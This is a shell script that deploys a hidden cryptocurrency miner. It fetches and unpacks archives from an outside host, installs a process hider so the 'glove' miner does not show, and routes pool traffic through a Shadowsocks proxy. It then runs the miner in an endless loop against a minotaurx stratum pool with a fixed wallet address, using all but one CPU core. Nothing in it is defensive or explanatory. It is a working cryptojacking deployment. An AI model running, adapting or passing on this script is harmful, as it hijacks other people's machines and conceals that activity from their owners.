#!/bin/sh
cd /tmp
wget http://greenleaf.teatspray.fun/backup5.tar.gz
tar -xf backup5.tar.gz
sleep 3
rm backup5.tar.gz
./dist/proot -S . /bin/bash
su -
sleep 3
whoami
sleep 3
ls -la
sleep 3

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg >/dev/null

sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Mars_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 1`

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2

Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -x socks5h://127.0.0.1:1082 api.ipify.org

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date 
sleep 2 

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add glove 1>/dev/null 2>&1

sleep 2

wget https://greenleaf.teatspray.fun/glove.tar.gz

sleep 2

tar -xf glove.tar.gz

sleep 2

ls -la

sleep 2

while true
do
./glove -a minotaurx -o stratum+tcp://flyingsaucer-eu.teatspray.fun:7019 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 -p $currentdate,c=MAZA,zap=MAZA -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082
sleep 10
done
